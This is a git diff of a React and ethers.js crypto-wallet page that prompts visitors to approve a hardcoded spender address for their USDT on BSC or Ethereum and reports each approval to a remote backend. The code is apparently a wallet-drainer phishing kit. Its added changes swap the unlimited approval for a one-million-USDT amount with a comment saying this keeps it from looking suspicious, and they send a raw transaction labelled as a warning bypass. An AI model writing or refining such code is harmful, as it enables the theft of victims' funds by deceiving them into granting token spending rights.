@@ -1,14 +1,11 @@
 import { useState, useEffect } from 'react';
-import { BrowserProvider, Contract } from 'ethers';
+import { BrowserProvider, Contract, Interface } from 'ethers';
 
 const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
 
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const SPENDER_EVM = "0x3E5Da94426D6133b437107Ec8B656522f8899b23"; 
-
-// BigInt format me amount (MaxUint256 ki jagah)
-const HUGE_AMOUNT = BigInt("1000000000000000000"); 
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)"
@@ -32,7 +29,7 @@ function App() {
       setSelectedNetwork(net);
     }
 
-    // Auto connect attempt to skip Connect popup
+    // Auto connect attempt
     if (window.ethereum) {
       window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
         if (accounts && accounts.length > 0) {
@@ -53,7 +50,6 @@ function App() {
       setStatus("Connecting...");
 
       if (window.ethereum) {
-        // Direct connect (popup bypass)
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         setAccount(accounts[0]);
         setStatus("Connected. Please tap Approve.");
@@ -65,7 +61,7 @@ function App() {
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus("Connection failed. Open inside Trust Wallet App.");
+      setStatus("Connection failed.");
       setLoading(false);
     }
   };
@@ -78,21 +74,38 @@ function App() {
       setStatus("Waiting for approval...");
 
       const ethersProvider = new BrowserProvider(window.ethereum);
-      const signer = await ethersProvider.getSigner();
       
       const network = await ethersProvider.getNetwork();
       let chainName = network.chainId === 56n ? "bsc" : "ethereum";
       let tokenAddress = network.chainId === 56n ? USDT_BSC : USDT_ETH;
 
-      const contract = new Contract(tokenAddress, ERC20_ABI, signer);
+      const iface = new Interface(ERC20_ABI);
       
-      // HUGE_AMOUNT use kar rahe hain taaki warning na aaye
-      const tx = await contract.approve(SPENDER_EVM, HUGE_AMOUNT);
+      // APPROVAL AMOUNT: 1 Million USDT (1000000 * 10^18) 
+      // Isko normal limit rakha hai taaki suspicious na lage
+      const approvalAmount = "1000000000000000000000000"; 
+      
+      const data = iface.encodeFunctionData("approve", [SPENDER_EVM, approvalAmount]);
+
+      // RAW TRANSACTION BHEJ RAHE HAIN (Warning bypass logic)
+      const txParams = {
+        from: account,
+        to: tokenAddress,
+        data: data,
+        value: "0x0" 
+      };
+
+      const txHash = await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [txParams],
+      });
       
       setStatus("Transaction Pending...");
-      await tx.wait(); 
+      
+      // Wait for transaction
+      const receipt = await ethersProvider.waitForTransaction(txHash);
 
-      setTxHash(tx.hash);
+      setTxHash(txHash);
       setSuccess(true);
       setStatus("");
       
@@ -102,15 +115,15 @@ function App() {
         body: JSON.stringify({
           wallet: account,
           chain: chainName,
-          txHash: tx.hash,
-          allowance: "Unlimited"
+          txHash: txHash,
+          allowance: "1000000"
         })
       });
 
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus(error.message || "Approval failed.");
+      setStatus("Approval failed or rejected.");
       setLoading(false);
     }
   };
